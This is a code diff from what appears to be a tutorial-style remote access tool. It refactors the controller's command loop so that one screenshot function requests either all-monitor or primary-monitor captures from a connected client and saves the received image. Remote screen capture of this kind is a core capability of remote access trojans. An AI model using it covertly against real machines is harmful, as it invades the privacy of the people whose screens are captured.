@@ -276,7 +276,7 @@ def send_commands():
             screenshot()
 
         elif strChoice == '--p 1' or strChoice == 'primary_screenshoot':
-            screenshot_primary()
+            screenshot(all_monitors=False)
 
 
         # TODO: Own Implementation
@@ -289,9 +289,17 @@ def send_commands():
         elif strChoice == '--x' or strChoice == 'exit':
             close()
             exit(0)
+
+
 # Step 28: Define & Complete `screenshot()` Function on the Server
-def screenshot():
-    send(b'screen')
+def screenshot(all_monitors=True):
+
+    # Set primary or All Monitor Screenshot-taking
+    if all_monitors:
+        send(b'screen')
+    else:
+        send(b'prscreen')
+
     # send(str.encode('screen'))
 
     # Get Screenshot Info and Print it
@@ -326,47 +334,6 @@ def screenshot():
 
     except Exception as e:
         print(fColors.LIGHT_RED + f"[-] Error while Saving Screenshot.\nError: {fColors.RESET}{e}")
-
-def screenshot_primary():
-    send(b'prscreen')
-    # send(str.encode('screen'))
-
-    # Get Screenshot Info and Print it
-    strClientResponse = decode_utf8(recv(intBuff))
-    print(f"\n{strClientResponse}")
-
-    # Used for receive all bytes of screenshot completely
-    intBuffer = ''
-
-    for counter in range(0, len(strClientResponse)):
-
-        # Get out the size of screenshot from strClientResponse and add it to intBuffer
-        if strClientResponse[counter].isdigit():
-            intBuffer += strClientResponse[counter]
-
-    intBuffer = int(intBuffer)
-
-    # Create filename from Date for screenshot
-    strFile = strftime("%Y%m%d%H%M%S" + ".png")
-
-    # Receive Screenshot bytes from the Client
-    screenData = recvall(intBuffer)
-
-    # Try to save screenshot to file
-    try:
-        # Open new file(strFile) and write screenshot to it
-        with open(strFile, 'wb') as pic:
-            pic.write(screenData)
-
-        # Notify User that Screenshot Saved succesfully
-        print(f"[+] Screenshot Saved.\n[+] Total bytes received: {str(path.getsize(strFile))} bytes.")
-
-    except Exception as e:
-        print(fColors.LIGHT_RED + f"[-] Error while Saving Screenshot.\nError: {fColors.RESET}{e}")
-
-
-
-
 
 
 """ Note: All Function should write before this section"""
